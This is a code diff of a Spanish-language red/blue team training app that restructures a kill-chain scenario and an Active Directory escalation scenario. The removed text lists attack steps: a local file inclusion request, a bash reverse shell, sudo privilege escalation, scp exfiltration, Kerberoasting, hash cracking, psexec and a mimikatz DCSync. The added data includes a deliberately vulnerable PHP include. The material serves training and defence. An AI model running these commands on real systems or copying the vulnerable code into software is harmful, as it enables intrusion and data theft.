@@ -1,4 +1,5 @@
 
+
 import React from 'react';
 import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';
 
@@ -99,7 +100,7 @@ export const CisoCard: React.FC<{ icon?: string; title?: string; children: React
     </div>
 );
 
-const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
+export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
     <div className="overflow-x-auto border border-[rgba(184,134,11,0.2)] rounded-lg my-4 shadow-lg">
         <table className="w-full min-w-[600px] border-collapse">
             <thead>
@@ -222,11 +223,12 @@ export const fortressScenario: InteractiveScenario = {
     objectives: [
         { id: 'blue-firewall', description: 'Activar el firewall UFW y permitir solo SSH y HTTP/HTTPS', points: 20, required: true, validator: (env) => {
                 const fw = env.networks.dmz.firewall;
+                const mysqlRule = fw.rules.find(r => r.destPort === 3306);
                 return fw.enabled && 
                        fw.rules.some(r => r.action === 'allow' && r.destPort === 22) &&
                        fw.rules.some(r => r.action === 'allow' && r.destPort === 80) &&
                        fw.rules.some(r => r.action === 'allow' && r.destPort === 443) &&
-                       fw.rules.some(r => r.action === 'deny' && r.destPort === 3306);
+                       (!mysqlRule || mysqlRule.action === 'deny');
             }, hint: 'Comandos: sudo ufw enable, sudo ufw allow <puerto>, sudo ufw deny <puerto>'
         },
         { id: 'blue-ssh-hardening', description: 'Deshabilitar login directo de root en SSH', points: 15, required: true, validator: (env) => {
@@ -398,6 +400,127 @@ export const rageScenario: InteractiveScenario = {
     }
 };
 
+export const killChainScenario: InteractiveScenario = {
+    id: 'escenario9',
+    isInteractive: true,
+    icon: 'crosshair',
+    color: 'bg-red-800',
+    title: 'La Cadena de Infección (Kill Chain)',
+    subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna.',
+    description: 'El Equipo Rojo debe ejecutar una "Kill Chain" completa, desde la explotación web hasta la exfiltración de datos. El Equipo Azul debe cazar y contener la amenaza en cada fase.',
+    difficulty: 'advanced',
+    team: 'both',
+    initialEnvironment: {
+        networks: {
+            'dmz': {
+                hosts: [{
+                    ip: '10.0.0.10',
+                    hostname: 'WEB-DMZ-01',
+                    os: 'linux',
+                    services: {
+                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
+                        80: { name: 'nginx', version: '1.18', state: 'open', vulnerabilities: [{cve: 'CVE-2013-4547', description: 'LFI Vulnerability', severity: 'high'}] },
+                    },
+                    users: [{ username: 'blue-team', password: 'Blu3T34mDMZ!2024', privileges: 'admin' }],
+                    files: [{ path: '/var/www/html/view.php', permissions: '644', content: '<?php include($_GET["file"]); ?>', hash: 'lfi_vuln_hash' }]
+                }],
+                firewall: { enabled: true, rules: [{id: 'allow-ssh', action: 'allow', protocol: 'tcp', destPort: 22}, {id: 'allow-http', action: 'allow', protocol: 'tcp', destPort: 80}] },
+                ids: { enabled: true, signatures: ['LFI_ATTEMPT', 'REVERSE_SHELL'], alerts: [] }
+            },
+            'internal': {
+                hosts: [{
+                    ip: '10.10.0.50',
+                    hostname: 'DB-FINANCE-01',
+                    os: 'linux',
+                    services: { 
+                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
+                        3306: { name: 'mysql', version: '8.0', state: 'open', vulnerabilities: [] }
+                    },
+                    users: [{ username: 'root', password: 'DbP@ss2024!', privileges: 'root' }],
+                    files: [{ path: '/db/finance_backup.sql', permissions: '600', content: 'CREDIT_CARD_DATA_HERE', hash: 'finance_db_hash' }]
+                }],
+                firewall: { enabled: true, rules: [] },
+                ids: { enabled: false, signatures: [], alerts: [] }
+            }
+        },
+        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
+        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
+        timeline: []
+    },
+    objectives: [
+        { id: 'red-lfi', description: 'Explotar LFI para leer /etc/passwd en WEB-DMZ-01', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Red' && log.message.includes('/etc/passwd')) },
+        { id: 'red-rce', description: 'Obtener ejecución remota de código en WEB-DMZ-01', points: 25, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.0.10')},
+        { id: 'red-pivot', description: 'Acceder a DB-FINANCE-01 desde el servidor DMZ', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.50')},
+        { id: 'red-exfiltrate', description: 'Exfiltrar el archivo finance_backup.sql', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated') },
+        
+        { id: 'blue-detect-lfi', description: 'Detectar el intento de LFI en los logs de Nginx', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && log.message.includes('grep') && log.message.includes('../../')) },
+        { id: 'blue-contain-dmz', description: 'Contener la amenaza en WEB-DMZ-01 (bloquear IP, matar shell)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.length > 0 },
+        { id: 'blue-detect-pivot', description: 'Detectar el intento de pivoteo a la red interna', points: 30, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && log.message.includes('tcpdump -i eth1')) },
+        { id: 'blue-segment-network', description: 'Bloquear el acceso de la DMZ a la red interna', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '10.0.0.10') },
+    ],
+    hints: [
+        { trigger: (env) => env.timeline.some(log => log.message.includes('/etc/passwd')), message: '🚨 [EQUIPO AZUL] Intento de LFI detectado. Investiga los logs de Nginx y el proceso www-data inmediatamente.' },
+        { trigger: (env) => env.attackProgress.compromised.includes('10.0.0.10'), message: '💡 [EQUIPO ROJO] Estás dentro. Enumera las interfaces de red. ¿Hay una red interna a la que puedas pivotar?' },
+    ],
+    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
+};
+
+export const adEscalationScenario: InteractiveScenario = {
+    id: 'escenario10',
+    isInteractive: true,
+    icon: 'key',
+    color: 'bg-yellow-600',
+    title: 'La Escalada del Dominio (Active Directory)',
+    subtitle: "Ataque de Kerberoasting y Movimiento Lateral en 'cybervaltorix.local'.",
+    description: 'Desde un usuario de bajos privilegios, el Equipo Rojo debe escalar a Administrador de Dominio. El Equipo Azul debe proteger y monitorear Active Directory.',
+    difficulty: 'advanced',
+    team: 'both',
+    initialEnvironment: {
+        networks: {
+            'corp': {
+                hosts: [
+                    {
+                        ip: '10.10.0.5', hostname: 'DC-01', os: 'windows',
+                        services: { 389: { name: 'ldap', version: 'AD', state: 'open', vulnerabilities: [] } },
+                        users: [
+                            { username: 'Administrator', password: 'AdminP@ssw0rd!2024', privileges: 'root'},
+                            { username: 'svc_sql', password: 'SqlP@ssw0rd123', privileges: 'admin' },
+                            { username: 'pasante-red', password: 'Password123', privileges: 'user'},
+                        ],
+                        files: []
+                    },
+                    {
+                        ip: '10.10.0.20', hostname: 'WKSTN-07', os: 'windows',
+                        services: { 3389: { name: 'rdp', version: '10.0', state: 'open', vulnerabilities: [] } },
+                        users: [{ username: 'pasante-red', password: 'Password123', privileges: 'user' }],
+                        files: []
+                    }
+                ],
+                firewall: { enabled: true, rules: [] },
+                ids: { enabled: true, signatures: ['KERBEROASTING_RC4'], alerts: [] }
+            }
+        },
+        attackProgress: { reconnaissance: [], compromised: ['10.10.0.20'], credentials: {}, persistence: [] },
+        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
+        timeline: []
+    },
+    objectives: [
+        { id: 'red-kerberoast', description: "Ejecutar un ataque de Kerberoasting y obtener el hash TGS de 'svc_sql'", points: 30, required: true, validator: (env) => env.attackProgress.credentials['svc_sql_hash'] === '$krb5tgs$23$*...' },
+        { id: 'red-crack-hash', description: "Crackear el hash de 'svc_sql' para obtener la contraseña en texto plano", points: 20, required: true, validator: (env) => env.attackProgress.credentials['svc_sql@10.10.0.5'] === 'SqlP@ssw0rd123'},
+        { id: 'red-domain-admin', description: 'Comprometer el Domain Controller (DC-01) y obtener privilegios de Domain Admin', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.5') },
+        
+        { id: 'blue-detect-kerberoast', description: 'Detectar el ataque de Kerberoasting monitoreando eventos de seguridad (ID 4769)', points: 20, required: true, validator: (env) => env.defenseProgress.patchedVulnerabilities.includes('kerberoast_detected') },
+        { id: 'blue-secure-account', description: "Asegurar la cuenta 'svc_sql' (deshabilitar, resetear contraseña fuerte)", points: 20, required: true, validator: (env) => env.defenseProgress.hardenedHosts.includes('svc_sql_secured')},
+        { id: 'blue-prevent-lateral', description: 'Prevenir/detectar el movimiento lateral hacia el DC-01', points: 15, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('10.10.0.20')},
+    ],
+    hints: [
+        { trigger: (env) => env.timeline.filter(log => log.message.includes('kerberoast')).length > 0, message: '🚨 [EQUIPO AZUL] Múltiples solicitudes de tickets de servicio (TGS) para cuentas de servicio detectadas. ¡Posible Kerberoasting en progreso!' },
+        { trigger: (env) => !env.attackProgress.credentials['svc_sql@10.10.0.5'], message: '💡 [EQUIPO ROJO] La cuenta svc_sql tiene un SPN. Es un objetivo ideal para Kerberoasting. Usa Rubeus o GetUserSPNs.py.' },
+    ],
+    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
+};
+
+
 export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
     {
         id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
@@ -534,105 +657,8 @@ export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
     },
     fortressScenario,
     rageScenario,
-    {
-        id: 'escenario9', icon: 'crosshair', color: 'bg-red-800', title: 'Escenario 9: La Cadena de Infección (Kill Chain)',
-        subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna de finanzas.',
-        content: <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
-            <CisoCard icon="clipboard-list" title="Situación del Incidente">
-                <p>El SOC recibe alertas de bajo nivel sobre escaneos en el servidor 'WEB-DMZ-01'. Este servidor tiene una interfaz pública (eth0) y una interfaz interna (eth1) que conecta a la red '10.10.0.0/24', donde reside el servidor 'DB-FINANCE-01' (10.10.0.50).</p>
-                <p>Host Defensor (Azul): <code>ssh blue-team@WEB-DMZ-01</code></p>
-                <p>Host Atacante (Rojo): <code>pasante-red@soc-valtorix</code></p>
-            </CisoCard>
-            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: Detección en Profundidad y Contención">
-                <p>Estás en una cacería de amenazas (Threat Hunt). El atacante intentará ser sigiloso. Debes correlacionar eventos de diferentes fuentes para descubrir el ataque completo.</p>
-                <h4>Objetivo 1: Detección de Explotación Web (Logs)</h4>
-                <p>Monitorea los logs del servidor web en tiempo real.</p>
-                <pre><code>tail -f /var/log/nginx/access.log{"\n"}grep \"../../\" /var/log/nginx/access.log</code></pre>
-                <h4>Objetivo 2: Detección de Acceso (Procesos y Red)</h4>
-                <p>Una vez que el atacante está dentro, sus comandos crearán ruido. Búscalos.</p>
-                <pre><code>ps aux | grep \"www-data\"{"\n"}netstat -anp | grep \"ESTABLISHED\"</code></pre>
-                <h4>Objetivo 3: Detección de Pivoteo (Red Interna)</h4>
-                <p>La peor pesadilla: el atacante usa tu servidor para atacar otros. Revisa la interfaz interna.</p>
-                <pre><code>tcpdump -i eth1 -n 'not arp and not port 22'{"\n"}ifconfig</code></pre>
-                <h4>Objetivo 4: Contención y Erradicación</h4>
-                <p>Una vez detectado, debes aislar el servidor y eliminar la amenaza.</p>
-                <pre><code>sudo ufw deny from [IP_ATACANTE]{"\n"}kill -9 [PID_SHELL_INVERSA]{"\n"}sudo ifdown eth1</code></pre>
-            </CisoCard>
-            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: Infiltración, Pivoteo y Exfiltración">
-                <p>Tu objetivo no es el servidor web, es solo la puerta de entrada. El premio real está en la red interna de finanzas.</p>
-                <h4>Fase 1: Reconocimiento y Explotación Web</h4>
-                <p>Encuentra una vulnerabilidad en 'WEB-DMZ-01'.</p>
-                <pre><code>nmap -sV -p- WEB-DMZ-01{"\n"}dirb http://WEB-DMZ-01{"\n"}curl \"http://WEB-DMZ-01/view.php?file=../../../../etc/passwd\"</code></pre>
-                <h4>Fase 2: Acceso Inicial y Escalada</h4>
-                <p>La explotación web (simulada) te da ejecución de comandos como 'www-data'. Obtén una shell estable. (Simula una vulnerabilidad de 'sudo' mal configurada).</p>
-                <pre><code># En tu máquina (Listener):{"\n"}nc -lvnp 4444{"\n\n"}# En la víctima (via exploit web simulado):{"\n"}bash -c 'bash -i &gt;&amp; /dev/tcp/[TU_IP]/4444 0&gt;&amp;1'{"\n\n"}# Ya dentro de la shell inversa (como www-data):{"\n"}python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Estabilizar Shell{"\n"}sudo -l{"\n"}sudo /usr/bin/find . -exec /bin/sh \\; -quit # Escalada de privilegios</code></pre>
-                <h4>Fase 3: Pivoteo y Exfiltración de Datos</h4>
-                <p>Ahora eres 'root' en 'WEB-DMZ-01'. Usa el servidor como plataforma de salto.</p>
-                <pre><code>ifconfig # Descubrir la red interna en eth1{"\n"}nmap -sT 10.10.0.0/24 # Escanear la red interna (Pivoteo){"\n\n"}# Objetivo encontrado: 10.10.0.50{"\n"}ssh root@10.10.0.50 \"cat /db/finance_backup.sql\" &gt; backup.sql{"\n\n"}# Exfiltración (sacar los datos){"\n"}tar -czf loot.tar.gz backup.sql{"\n"}scp loot.tar.gz pasante-red@soc-valtorix:~</code></pre>
-            </CisoCard>
-            <CisoCard icon="brain-circuit" title="Puntos de Pensamiento Crítico">
-                <ul>
-                    <li><b>Para Equipo Azul:</b> Detectas al Equipo Rojo escaneando la red interna (Pivoteo). ¿Cuál es tu acción de contención MÁS URGENTE: (A) Bloquear la IP pública del atacante en el firewall, (B) Matar el proceso de la shell inversa, o (C) Desactivar la interfaz de red interna (eth1)? Justifica tu priorización.</li>
-                    <li><b>Para Equipo Rojo:</b> El Equipo Azul te detecta y mata tu shell inversa. Sin embargo, no han parchado la vulnerabilidad web. ¿Cómo mantendrías la persistencia en el servidor de una forma más sigilosa que una shell inversa activa?</li>
-                    <li><b>Para Ambos Equipos:</b> El Equipo Azul ha contenido la amenaza (IP bloqueada, shell muerta, eth1 abajo). El incidente no ha terminado. ¿Cuáles son los siguientes pasos del Equipo Azul (Erradicación y Recuperación) y qué evidencia debería buscar para confirmar que el Equipo Rojo no dejó 'regalos' (backdoors, cronjobs, etc.)?</li>
-                </ul>
-            </CisoCard>
-        </div>
-    },
-    {
-        id: 'escenario10',
-        icon: 'key',
-        color: 'bg-yellow-600',
-        title: 'Escenario 10: La Escalada del Dominio (Active Directory)',
-        subtitle: "Ataque de Kerberoasting y Movimiento Lateral en el dominio 'cybervaltorix.local'.",
-        content: <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
-            <CisoCard icon="clipboard-list" title="Situación del Incidente">
-                <p>El Equipo Rojo ha comprometido una estación de trabajo ('WKSTN-07') con un usuario de dominio de bajos privilegios ('pasante-red'). Su objetivo es escalar privilegios hasta Administrador de Dominio para acceder al servidor de bases de datos 'DB-FINANCE-01'. El Equipo Azul monitorea el Controlador de Dominio ('DC-01').</p>
-                <p>Host Defensor (Azul): <code>ssh admin-blue@DC-01</code></p>
-                <p>Host Atacante (Rojo): <code>ssh pasante-red@WKSTN-07</code></p>
-            </CisoCard>
-            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: Caza de Amenazas en AD">
-                <p>Estás monitoreando los logs de seguridad de 'DC-01'. Un atacante en la red es mucho más peligroso que uno externo. Debes detectar la enumeración y el abuso de protocolos.</p>
-                <h4>Objetivo 1: Monitoreo de Eventos en Vivo</h4>
-                <p>Establece tu línea base. Los eventos de Kerberos y autenticación son tu fuente de verdad.</p>
-                <pre><code>tail -f /var/log/ad-security.log</code></pre>
-                <h4>Objetivo 2: Detección de Enumeración</h4>
-                <p>El atacante primero buscará objetivos. Esto genera ruido de 'consultas' en los logs.</p>
-                <pre><code># (Simulación) Buscar logs de enumeración de usuarios/grupos{"\n"}grep "EventID=4798" /var/log/ad-security.log</code></pre>
-                <h4>Objetivo 3: Detección de Kerberoasting</h4>
-                <p>El ataque principal. El atacante solicitará tickets de servicio (TGS) para cuentas con SPN. Busca solicitudes de tickets con cifrado débil (RC4) o para cuentas de servicio inusuales.</p>
-                <pre><code># (Simulación) Buscar eventos de solicitud TGS (4769) sospechosos{"\n"}grep "EventID=4769" /var/log/ad-security.log | grep "svc_sql"</code></pre>
-                <h4>Objetivo 4: Contención y Remediación</h4>
-                <p>Una vez identificada la cuenta abusada, debes neutralizarla INMEDIATAMENTE.</p>
-                <pre><code># (Simulación) Deshabilitar cuenta en AD{"\n"}disable-ad-user -user svc_sql{"\n\n"}# (Simulación) Forzar reseteo de contraseña (más de 16 caracteres){"\n"}reset-ad-password -user svc_sql -force{"\n\n"}# Bloquear la estación de trabajo comprometida{"\n"}sudo ufw deny from [IP_WKSTN-07]</code></pre>
-            </CisoCard>
-            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: De Pasante a Administrador de Dominio">
-                <p>Estás dentro de la red. Es hora de cazar credenciales y moverte lateralmente.</p>
-                <h4>Fase 1: Enumeración de Dominio (BloodHound)</h4>
-                <p>Mapea el dominio para encontrar tu camino al 'Domain Admin'.</p>
-                <pre><code># (Simulación) Ejecutar colector de BloodHound{"\n"}bloodhound-cli -d cybervaltorix.local -c all</code></pre>
-                <h4>Fase 2: Identificar Objetivos (Kerberoasting)</h4>
-                <p>Tu BloodHound (simulado) revela una cuenta de servicio 'svc_sql' con un SPN. Esta es un objetivo perfecto para Kerberoasting.</p>
-                <pre><code># (Simulación) Solicitar un TGS para la cuenta de servicio{"\n"}GetUserSPNs.py -dc-ip 10.10.0.5 -request -user svc_sql</code></pre>
-                <h4>Fase 3: Cracking Offline (Hashcat)</h4>
-                <p>El TGS contiene un hash de la contraseña del usuario. Craquéalo offline.</p>
-                <pre><code># (Simulación) Usar Hashcat para romper el hash TGS (Modo 13100){"\n"}hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt</code></pre>
-                <h4>Fase 4: Movimiento Lateral (psexec)</h4>
-                <p>¡Éxito! La contraseña era 'SqlP@ssw0rd123'. Tu BloodHound te dijo que 'svc_sql' es Admin Local en 'DC-01'. Usa esto para escalar.</p>
-                <pre><code># (Simulación) Usar psexec (o similar) para obtener una shell como svc_sql en DC-01{"\n"}psexec.py svc_sql@DC-01 cmd.exe</code></pre>
-                <h4>Fase 5: Dominio Total (DCSync)</h4>
-                <p>Ahora eres admin en el DC. Exfiltra todos los hashes del dominio.</p>
-                <pre><code># (Simulación) Ejecutar Mimikatz o similar para DCSync{"\n"}mimikatz.exe "lsadump::dcsync /domain:cybervaltorix.local /all"</code></pre>
-            </CisoCard>
-            <CisoCard icon="brain-circuit" title="Puntos de Pensamiento Crítico">
-                <ul>
-                    <li><b>Para Equipo Azul:</b> Detectas el Kerberoasting (Fase 3 del Rojo). ¿Cuál es tu prioridad MÁS ALTA: (A) Deshabilitar la cuenta 'svc_sql', (B) Bloquear la IP de 'WKSTN-07', o (C) Forzar un reseteo de contraseña para 'svc_sql'? Justifica tu elección.</li>
-                    <li><b>Para Equipo Rojo:</b> El Equipo Azul te detecta y resetea la contraseña de 'svc_sql'. Tu ataque de Kerberoasting falló. Sin embargo, tu enumeración de BloodHound (Fase 1) sigue siendo válida. ¿Cuál sería tu siguiente vector de ataque? (Ej. Buscar otro SPN, buscar contraseñas en GPO, etc.)</li>
-                    <li><b>Para Ambos Equipos:</b> El ataque tuvo éxito porque la cuenta de servicio 'svc_sql' tenía (1) una contraseña débil y (2) privilegios excesivos (Admin en el DC). ¿Cuál es la solución de Active Directory moderna y a largo plazo para prevenir el Kerberoasting de cuentas de servicio? (Pista: gMSA - group Managed Service Accounts).</li>
-                </ul>
-            </CisoCard>
-        </div>
-    },
+    killChainScenario,
+    adEscalationScenario,
 ];
 
 // FIX: Add missing RESOURCE_MODULES export
